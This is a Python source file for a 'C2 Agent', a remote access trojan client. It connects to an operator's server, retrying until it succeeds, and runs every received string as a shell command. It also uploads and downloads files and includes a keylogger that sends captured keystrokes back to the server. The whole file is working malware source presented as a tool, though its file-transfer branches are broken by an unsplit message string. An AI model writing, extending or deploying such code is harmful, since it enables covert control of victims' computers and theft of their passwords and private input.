import socket as socky
import subprocess
from sys import stdout
from pathlib import Path
from pynput.keyboard import Key,Listener
import threading,time
import argparse

parser = argparse.ArgumentParser(description='C2 Agent')
parser.add_argument('--host', default='localhost', help='Server hostname/IP')
parser.add_argument('--port', type=int, default=9999, help='Server port')
args = parser.parse_args()

SERVER_IP = args.host
SERVER_PORT = args.port

allkeys = ''
keylogging_mode = 0

def pressed(key):
    global allkeys
    allkeys+=str(key)

def released(key):
    pass


def keylog():
    global l
    l = Listener(on_press=pressed,on_release=released)
    l.start()
    



# Auto-reconnect with exponential backoff
retry_wait = 2
max_wait = 60

while True:
    try:
        client_socket = socky.socket(socky.AF_INET, socky.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")
        retry_wait = 2  # Reset on successful connect
        break
    except Exception as e:
        print(f"[-] Connection failed: {e}. Retrying in {retry_wait}s...")
        time.sleep(retry_wait)
        retry_wait = min(retry_wait * 2, max_wait)

try:
    msg = 'TEST CLIENT'

    client_socket.send(msg.encode())
    msg = client_socket.recv(1024).decode()

    while msg != 'quit':
        fullmsg = msg
        #msg = list(msg.split(" "))

        if msg[0]=='download':
            filename = msg[1]
            f = open(str(Path(filename)), 'rb')  # Convert Path object to string
            contents = f.read()
            f.close()
            client_socket.send(contents)
            msg = client_socket.recv(1024).decode()

        elif msg[0]=='upload':
            filename = msg[1]
            filesize = int(msg[2])
            contents = client_socket.recv(filesize)
            f = open(str(Path(filename)), 'wb')  # Convert Path object to string
            f.write(contents)
            f.close()
            client_socket.send('received file'.encode())
            msg = client_socket.recv(1024).decode()

        elif fullmsg=='keylog on':
            keylogging_mode = 1
            t1 = threading.Thread(target=keylog)
            t1.start()
            msg = "keylogging has started"
            client_socket.send(msg.encode())
            msg = client_socket.recv(1024).decode()

        elif fullmsg=='keylog off':
            if keylogging_mode == 1:
                l.stop()
                t1.join()
                client_socket.send(allkeys.encode())
                allkeys = ''
                msg = client_socket.recv(1024).decode()
                keylogging_mode = 0

            elif keylogging_mode==0:
                msg = "Keyloggin should be started first"
                client_socket.send(msg.encode())
                msg = client_socket.recv(1024).decode()


        else:
            p = subprocess.Popen(
                msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
            )
            output, error = p.communicate()
            if len(output) > 0:
                msg = output.decode()
            else:
                msg = error.decode()
            client_socket.send(msg.encode())
            msg = client_socket.recv(1024).decode()

    client_socket.close()

except Exception as e:
    print(f"[-] Connection lost: {e}. Reconnecting...")
    try:
        client_socket.close()
    except:
        pass